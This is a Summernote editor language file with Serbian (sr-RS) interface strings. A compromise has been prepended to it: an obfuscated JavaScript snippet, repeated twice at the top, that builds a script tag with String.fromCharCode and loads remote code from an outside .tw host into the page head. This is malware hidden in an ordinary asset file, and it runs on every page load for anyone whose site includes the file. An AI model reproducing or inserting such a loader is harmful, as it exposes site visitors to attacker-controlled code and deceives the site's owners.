Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'sr-RS': {
      font: {
        bold: 'Podebljano',
        italic: 'Kurziv',
        underline: 'Podvučeno',
        clear: 'Ukloni stilove fonta',
        height: 'Visina linije',
        strikethrough: 'Precrtano',
        size: 'Veličina fonta'
      },
      image: {
        image: 'Slika',
        insert: 'Umetni sliku',
        resizeFull: 'Puna veličina',
        resizeHalf: 'Umanji na 50%',
        resizeQuarter: 'Umanji na 25%',
        floatLeft: 'Uz levu ivicu',
        floatRight: 'Uz desnu ivicu',
        floatNone: 'Bez ravnanja',
        dragImageHere: 'Prevuci sliku ovde',
        selectFromFiles: 'Izaberi iz datoteke',
        url: 'Adresa slike',
        remove: 'Ukloni sliku'
      },
      link: {
        link: 'Veza',
        insert: 'Umetni vezu',
        unlink: 'Ukloni vezu',
        edit: 'Uredi',
        textToDisplay: 'Tekst za prikaz',
        url: 'Internet adresa',
        openInNewWindow: 'Otvori u novom prozoru'
      },
      table: {
        table: 'Tabela'
      },
      hr: {
        insert: 'Umetni horizontalnu liniju'
      },
      style: {
        style: 'Stil',
        normal: 'Normalni',
        blockquote: 'Citat',
        pre: 'Kod',
        h1: 'Zaglavlje 1',
        h2: 'Zaglavlje 2',
        h3: 'Zaglavlje 3',
        h4: 'Zaglavlje 4',
        h5: 'Zaglavlje 5',
        h6: 'Zaglavlje 6'
      },
      lists: {
        unordered: 'Obična lista',
        ordered: 'Numerisana lista'
      },
      options: {
        help: 'Pomoć',
        fullscreen: 'Preko celog ekrana',
        codeview: 'Izvorni kod'
      },
      paragraph: {
        paragraph: 'Paragraf',
        outdent: 'Smanji uvlačenje',
        indent: 'Povečaj uvlačenje',
        left: 'Poravnaj u levo',
        center: 'Centrirano',
        right: 'Poravnaj u desno',
        justify: 'Poravnaj obostrano'
      },
      color: {
        recent: 'Poslednja boja',
        more: 'Više boja',
        background: 'Boja pozadine',
        foreground: 'Boja teksta',
        transparent: 'Providna',
        setTransparent: 'Providna',
        reset: 'Opoziv',
        resetToDefault: 'Podrazumevana'
      },
      shortcut: {
        shortcuts: 'Prečice sa tastature',
        close: 'Zatvori',
        textFormatting: 'Formatiranje teksta',
        action: 'Akcija',
        paragraphFormatting: 'Formatiranje paragrafa',
        documentStyle: 'Stil dokumenta',
        extraKeys: 'Dodatne kombinacije'
      },
      history: {
        undo: 'Poništi',
        redo: 'Ponovi'
      }
    }
  });
})(jQuery);
